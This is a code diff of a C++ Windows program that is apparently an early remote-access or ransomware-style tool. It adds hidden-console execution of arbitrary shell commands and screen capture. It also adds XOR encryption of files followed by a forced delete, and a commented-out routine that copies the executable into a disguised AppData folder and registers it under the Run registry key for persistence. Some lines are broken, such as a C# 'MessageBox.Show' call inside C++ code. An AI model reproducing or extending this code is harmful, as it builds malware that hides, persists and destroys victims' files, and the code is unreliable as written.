@@ -9,6 +9,8 @@
 
 using namespace std;
 
+string ra_RunCommand(string ra_cmd);
+
 string convertToString(char* a, int size)
 {
     int i;
@@ -18,9 +20,30 @@ string convertToString(char* a, int size)
     }
     return s;
 }
+/*
+std::wstring s2ws(const std::string& str)
+{
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
+    std::wstring wstrTo(size_needed, 0);
+    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
+    return wstrTo;
+}
+
+void ra_Startup(int argc, char** argv) {
+    string ra_copy1 = "mkdir C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\" ;
+    string ra_copy2 = "copy " + convertToString(argv[0], sizeof(argv[0])) + " C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\";
+    ra_RunCommand(ra_copy1);
+    ra_RunCommand(ra_copy2);
+    std::wstring progPath = L"C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\"+ s2ws(convertToString(argv[0], sizeof(argv[0])));
+    HKEY hkey = NULL;
+    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
+    LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
 
 
-void CapruteScreenAndSaveToFile()
+}
+*/
+
+void ra_CapruteScreenAndSaveToFile()
 {
     
     uint16_t BitsPerPixel = 24;
@@ -56,7 +79,7 @@ void CapruteScreenAndSaveToFile()
     free(buffer);
 }
 
-string RunCommand(string ra_cmd) {
+string ra_RunCommand(string ra_cmd) {
     
     char   psBuffer[128];
     FILE* pPipe;
@@ -64,7 +87,7 @@ string RunCommand(string ra_cmd) {
     string temp;
     output = "";
 
-    if ((pPipe = _popen("dir", "rt")) == NULL)
+    if ((pPipe = _popen(ra_cmd.c_str(), "rt")) == NULL)
         exit(1);
     while (fgets(psBuffer, 128, pPipe)) {
         output = output +  convertToString(psBuffer,128);
@@ -74,10 +97,49 @@ string RunCommand(string ra_cmd) {
 }
 
 
-int main()
-{
-    
 
-    RunCommand("dir") ;
+void HideConsole()
+{
+    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+}
+
+string encrypt(string msg,string key)
+{
+    string tmp(key);
+    while (key.size() < msg.size())
+        key += tmp;
+    for (string::size_type i = 0; i < msg.size(); ++i)
+        msg[i] ^= key[i];
+    return msg;
+}
+string decrypt(string msg, string key)
+{
+    return encrypt(msg, key); 
+}
+
+void ra_encryptFile(string filename, string key) {
+    string name;
+    
+    std::ifstream dataFile(filename);
+    std::ofstream dataFileEnc;
+    dataFileEnc.open(filename + "crypt");
+    while (!dataFile.fail() && !dataFile.eof())
+    {
+        dataFile >> name;
+        dataFileEnc << encrypt(name, key);
+        cout << name << endl;
+    }
+    dataFile.close();
+    dataFileEnc.close();
+    ra_RunCommand("del /f test.txt");
+}
+
+
+int main(int argc, char** argv)
+{   
+    MessageBox.Show("Some text", "Some title",MessageBoxButtons.OK, MessageBoxIcon.Error);
+    //HideConsole();
+    //ra_RunCommand("dir") ;
+    system("PAUSE");
     return 0;
 }
